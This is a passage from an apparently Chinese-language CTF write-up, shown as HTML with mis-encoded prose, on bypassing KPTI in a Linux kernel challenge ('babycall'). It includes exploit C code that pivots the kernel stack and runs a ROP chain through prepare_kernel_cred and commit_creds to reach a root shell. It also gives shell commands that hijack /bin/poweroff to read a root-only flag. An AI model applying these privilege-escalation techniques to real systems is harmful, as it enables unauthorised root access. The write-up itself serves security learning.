	<span class="n">pushq</span>	<span class="o">%</span><span class="n">r11</span>						<span class="cm">/* pt_regs-&gt;flags */</span>
	<span class="n">pushq</span>	<span class="err">$</span><span class="n">__USER_CS</span>					<span class="cm">/* pt_regs-&gt;cs */</span>
	<span class="n">pushq</span>	<span class="o">%</span><span class="n">rcx</span>						<span class="cm">/* pt_regs-&gt;ip */</span>
<span class="n">GLOBAL</span><span class="p">(</span><span class="n">entry_SYSCALL_64_after_hwframe</span><span class="p">)</span>
	<span class="n">pushq</span>	<span class="o">%</span><span class="n">rax</span>						<span class="cm">/* pt_regs-&gt;orig_ax */</span>

	<span class="n">PUSH_AND_CLEAR_REGS</span> <span class="n">rax</span><span class="o">=</span><span class="err">$</span><span class="o">-</span><span class="n">ENOSYS</span>

	<span class="n">TRACE_IRQS_OFF</span>

	<span class="cm">/* IRQs are off. */</span>
	<span class="n">movq</span>	<span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
	<span class="n">movq</span>	<span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rsi</span>
	<span class="n">call</span>	<span class="n">do_syscall_64</span>				<span class="cm">/* returns with IRQs disabled */</span>

	<span class="n">TRACE_IRQS_IRETQ</span>					<span class="cm">/* we&#39;re about to change IF */</span>
	<span class="p">......</span>
	<span class="p">......</span>
<span class="nl">syscall_return_via_sysret</span><span class="p">:</span>
	<span class="cm">/* rcx and r11 are already restored (see code above) */</span>
	<span class="n">POP_REGS</span> <span class="n">pop_rdi</span><span class="o">=</span><span class="mi">0</span> <span class="n">skip_r11rcx</span><span class="o">=</span><span class="mi">1</span>

	<span class="cm">/*
</span><span class="cm">	 * Now all regs are restored except RSP and RDI.
</span><span class="cm">	 * Save old stack pointer and switch to trampoline stack.
</span><span class="cm">	 */</span>
	<span class="n">movq</span>	<span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
	<span class="n">movq</span>	<span class="n">PER_CPU_VAR</span><span class="p">(</span><span class="n">cpu_tss_rw</span> <span class="o">+</span> <span class="n">TSS_sp0</span><span class="p">),</span> <span class="o">%</span><span class="n">rsp</span>
	<span class="n">UNWIND_HINT_EMPTY</span>

	<span class="n">pushq</span>	<span class="n">RSP</span><span class="o">-</span><span class="n">RDI</span><span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>	<span class="cm">/* RSP */</span>
	<span class="n">pushq</span>	<span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>			<span class="cm">/* RDI */</span>

	<span class="cm">/*
</span><span class="cm">	 * We are on the trampoline stack.  All regs except RDI are live.
</span><span class="cm">	 * We can do future final exit work right here.
</span><span class="cm">	 */</span>
	<span class="n">SWITCH_TO_USER_CR3_STACK</span> <span class="n">scratch_reg</span><span class="o">=%</span><span class="n">rdi</span>

	<span class="n">popq</span>	<span class="o">%</span><span class="n">rdi</span>
	<span class="n">popq</span>	<span class="o">%</span><span class="n">rsp</span>
	<span class="n">USERGS_SYSRET64</span>
<span class="n">END</span><span class="p">(</span><span class="n">entry_SYSCALL_64</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p><code>syscall</code>ä¸ä¼šä¿å­˜æ ˆæŒ‡é’ˆ,å› æ­¤<code>handler</code>é¦–å…ˆå°†å½“å‰ç”¨æˆ·æ€æ ˆåç§»RSPå­˜åˆ°<code>per-cpu</code>å˜é‡<code>rsp_scratch</code>ä¸­,ç„¶åå°†<code>per-cpu</code>å˜é‡<code>cpu_current_top_of_stack</code>,å³å†…æ ¸æ€çš„æ ˆåç§»åŠ è½½åˆ° RSP.</p>
<p>SYSCALLè°ƒç”¨è¿”å›æ—¶è°ƒç”¨SYSRET,å­˜åœ¨<code>SWITCH_TO_USER_CR3_STACK</code>æ­¤å®å®šä¹‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-ASM" data-lang="ASM"><span class="nf">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">cr3</span>
<span class="nf">or</span>      <span class="no">rdi</span><span class="p">,</span> <span class="mi">1000</span><span class="no">h</span>
<span class="nf">mov</span>     <span class="no">cr3</span><span class="p">,</span> <span class="no">rdi</span>
</code></pre></td></tr></table>
</div>
</div><p>æ­¤å¤„ä¿®æ”¹CR3çš„å€¼åˆ™ç”±å†…æ ¸æ€çš„PGDåˆ‡æ¢ç”¨æˆ·æ€å¯¹åº”çš„PGD</p>
<p>æ•…å¯ä»¥åˆ©ç”¨æ­¤å¤„è¿™æ®µgadgetæ¥æ§åˆ¶CR3å¯„å­˜å™¨ä»è€Œåˆ‡æ¢åˆ°ç”¨æˆ·æ€,ä¹Ÿå¯ä»¥åˆ©ç”¨<code>swapgs_restore_regs_and_return_to_usermode</code>å‡½æ•°æ¥è¿›è¡Œä¿®æ”¹CR3çš„å€¼å®ç°æ€çš„åˆ‡æ¢</p>
<h3 id="åˆ©ç”¨">åˆ©ç”¨</h3>
<h4 id="1bypass-kpti-and-rop">1.Bypass KPTI and ROP</h4>
<p>å› ä¸ºå¯ä»¥æ§åˆ¶BSSæ•°æ®,æ‰€ä»¥ç¬¬ä¸€æ¬¡ä¿®æ”¹vulnå‡½æ•°æŒ‡é’ˆ,å› ä¸ºæ²¡æœ‰å¼€å¯smapä¿æŠ¤,é…åˆ<code>xchg esp, ecx</code>å°†å†…æ ¸æ ˆè¿ç§»åˆ°<code>ç”¨æˆ·æ€çš„æ•°æ®æ®µä¸Š</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">save_status</span><span class="p">();</span>
	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/babycall&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
	<span class="n">size_t</span> <span class="n">key</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">memset</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
	<span class="n">memset</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">ROP</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
	
	<span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0F0E0E0B0D0A0E0D</span><span class="p">;</span>
	<span class="n">key</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF81943495</span><span class="p">;</span> <span class="c1">// xchg esp, ecx; add eax, 0x5D010000; ret;
</span><span class="c1"></span>
	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x10001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p>ç¬¬äºŒæ¬¡è°ƒç”¨,åˆ™ä¼šä¼ å…¥ROP,ROPæ­¤å¤„æ˜¯ä½äºåˆ©ç”¨ç¨‹åºçš„BSSæ®µä¸Š,å› ä¸ºæ²¡æœ‰å¼€å¯<code>SMAP</code>ä¿æŠ¤,æ‰€ä»¥å¯ä»¥ç”±å†…æ ¸æ ˆè¿ç§»åˆ°ç”¨æˆ·æ€,é¦–å…ˆåˆ©ç”¨<code>prepare_kernel_cred</code>å’Œ<code>commit_creds</code>ææƒ,ç”±äºæˆ‘æ²¡æ‰¾åˆ°é€‚åˆçš„<code>mov rdi, rax</code>çš„gadget,æ‰€ä»¥ä¸­é—´ç”¨äº†ä¸¤ä¸ªgadgetç»„åˆæ¥æ§åˆ¶æ ‡å¿—å¯„å­˜å™¨ä¸­zero flagä½,ç„¶åç»•è¿‡äº†<code>jne 0x32A6FC</code>ææƒååˆ™åˆ©ç”¨<code>swapgs_restore_regs_and_return_to_usermode</code>ä»å†…æ ¸æ€åˆ‡æ¢åˆ°ç”¨æˆ·æ€,æ±‡ç¼–å¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pop</span>    <span class="no">r15</span>
<span class="nf">pop</span>    <span class="no">r14</span>
<span class="nf">pop</span>    <span class="no">r13</span>
<span class="nf">pop</span>    <span class="no">r12</span>
<span class="nf">pop</span>    <span class="no">rbp</span>
<span class="nf">pop</span>    <span class="no">rbx</span>
<span class="nf">pop</span>    <span class="no">r11</span>
<span class="nf">pop</span>    <span class="no">r10</span>
<span class="nf">pop</span>    <span class="no">r9</span>
<span class="nf">pop</span>    <span class="no">r8</span>
<span class="nf">pop</span>    <span class="no">rax</span>
<span class="nf">pop</span>    <span class="no">rcx</span>
<span class="nf">pop</span>    <span class="no">rdx</span>
<span class="nf">pop</span>    <span class="no">rsi</span>
<span class="nf">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rsp</span>
<span class="nf">mov</span>    <span class="no">rsp</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">gs</span><span class="p">:</span><span class="mi">0x5004</span>
<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x30</span><span class="p">]</span>
<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x28</span><span class="p">]</span>
<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x20</span><span class="p">]</span>
<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x18</span><span class="p">]</span>
<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="mi">0x10</span><span class="p">]</span>
<span class="nf">push</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdi</span><span class="p">]</span>
<span class="nf">push</span>   <span class="no">rax</span>
<span class="nf">xchg</span>   <span class="no">ax</span><span class="p">,</span><span class="no">ax</span>
<span class="nf">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">cr3</span>
<span class="nf">jmp</span>    <span class="mi">0xFFFFFFFF81C00AA3</span>
<span class="err">â†“</span>

<span class="nf">or</span>     <span class="no">rdi</span><span class="p">,</span> <span class="mi">0x1000</span>
<span class="nf">mov</span>    <span class="no">cr3</span><span class="p">,</span> <span class="no">rdi</span>
<span class="nf">pop</span>    <span class="no">rax</span>
<span class="nf">pop</span>    <span class="no">rdi</span>
<span class="nf">swapgs</span> 
<span class="no">nop</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
<span class="nf">jmp</span>    <span class="mi">0xFFFFFFFF81C00AE0</span>
<span class="err">â†“</span>

<span class="nf">test</span>   <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">0x20</span><span class="p">],</span> <span class="mi">4</span>
<span class="nf">jne</span>    <span class="mi">0xFFFFFFFF81C00AE9</span>
<span class="err">â†“</span>

<span class="nf">iretq</span>
</code></pre></td></tr></table>
</div>
</div><p>æœ€å<code>iretq</code>çš„æ¡ä»¶åœ¨ä¹‹å‰ç”±<code>RDI</code>æ§åˆ¶å¹¶å‹å…¥æ ˆä¸­å³å¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF81026CAD</span><span class="p">;</span> <span class="c1">//pop rdi; ret
</span><span class="c1"></span>	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF8131422E</span><span class="p">;</span> <span class="c1">// pop rsi; ret;
</span><span class="c1"></span>	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF812A451A</span><span class="p">;</span> <span class="c1">//test rsi, rsi; jne 0x4a4520; ret;
</span><span class="c1"></span>	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF8112A71A</span><span class="p">;</span> <span class="c1">//mov rdi, rax; jne 0x32A6FC; pop rbp; ret;
</span><span class="c1"></span>	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span><span class="p">;</span>
	<span class="n">i</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_shell</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
	<span class="n">ROP</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x10001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ROP</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
	<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="2æ ¹ç›®å½•æƒé™æ§åˆ¶ä¸ä¸¥çš„éé¢„æœŸ">2.æ ¹ç›®å½•æƒé™æ§åˆ¶ä¸ä¸¥çš„éé¢„æœŸ</h4>
<p>å› ä¸ºæ–‡ä»¶ç³»ç»Ÿç»™äº†æ ¹ç›®å½•çš„rootæƒé™,æ‰€ä»¥</p>
<pre><code>chmod 777 . ..
mv bin BIN
/BIN/mkdir bin
/BIN/chmod 777 bin
/BIN/echo &quot;/BIN/cat /flag&quot; &gt; /bin/poweroff
/BIN/chmod 777 /bin/poweroff
exit
</code></pre><p>å› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹/bin/ç›®å½•ä¸‹çš„æ–‡ä»¶,è®©æ–‡ä»¶ç³»ç»Ÿé‡Œé¢initå¯åŠ¨æ–‡ä»¶ç»“æŸçš„æ—¶å€™ä»¥<code>root</code>æƒé™å°†æ–‡ä»¶è¯»å–å‡ºæ¥</p>
<h4 id="çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</h4>
<ol>
<li>å¼€å¯KPTIä¿æŠ¤å,ç”±å†…æ ¸æ€åˆ‡æ¢åˆ°ç”¨æˆ·æ€,æ¶‰åŠåˆ°CR3å¯„å­˜å™¨çš„ä¿®æ”¹,å¯ä»¥ç”±<code>swapgs_restore_regs_and_return_to_usermode</code>å‡½æ•°ä¿®æ”¹CR3å¹¶è¿”å›åˆ°ç”¨æˆ·æ€</li>
<li>åœ¨æœªå¼€å¯SMAPä¿æŠ¤çš„æ—¶å€™,å¯ä»¥å°†å†…æ ¸æ ˆçš„ç©ºé—´è¿ç§»åˆ°ç”¨æˆ·æ€ä¸­,è‹¥å¸ƒç½®ROPåœ¨ç”¨æˆ·æ€,ROPé“¾æ„é€ å¯ä»¥æ›´åŠ çµæ´»</li>
</ol>
<h4 id="åè®°">åè®°</h4>
<p>å¯¹äºSYSCALLè°ƒç”¨è¿˜æœ‰ç‚¹æ¨¡ç³Š,ç¨åè¡¥ä¸€è¡¥</p>
<h4 id="reference">&ldquo;Reference&rdquo;</h4>
<p><a href="https://bbs.pediy.com/thread-258975.htm">[KERNEL PWNçŠ¶æ€åˆ‡æ¢åŸç†åŠKPTIç»•è¿‡]</a><br>
<a href="https://blog.csdn.net/juS3Ve/article/details/79544927">[KPTIè¡¥ä¸åˆ†æ]</a><br>
<a href="https://zhuanlan.zhihu.com/p/79236207?from_voters_page=true">[Linuxç³»ç»Ÿè°ƒç”¨è¿‡ç¨‹åˆ†æ]</a><br>
<a href="../attachment/DASCTF_babycall.zip">[é™„ä»¶]</a></p>

    </div>
</div>

<div class="container">
    
    <nav class="flex container suggested">
        
        <a rel="prev" href="/articles/starctf2019_hackme/" title="Previous post (older)">
            <span>Previous</span>
            StarCTF2019_Hackme
            </a>
        
        
        
        <a rel="next" href="/articles/cve-2021-3156%E5%8F%8Acve-2019-18634%E5%88%86%E6%9E%90/" title="Next post (newer)">
            <span>Next</span>
            ä»¥ä¸¤ä¸ªSudoæŒ‡ä»¤ç¼“å†²åŒºæº¢å‡ºCVEè¿›è¡Œåˆ†æ
            </a> 
        
    </nav>
    
</div>
</main>


        </main>
        <footer class="footer flex">
    <section class="container">
        <nav class="footer-links">
            
            <a href="/index.xml">RSS</a>
            
        </nav>
    </section>
    
    <script async src="/js/features.min.a94f58a30ad2560de728e080d87f75c60cf806fd1b3d5f4815f1a1a02c0d1859.js"></script>
</footer>
    </body>
</html>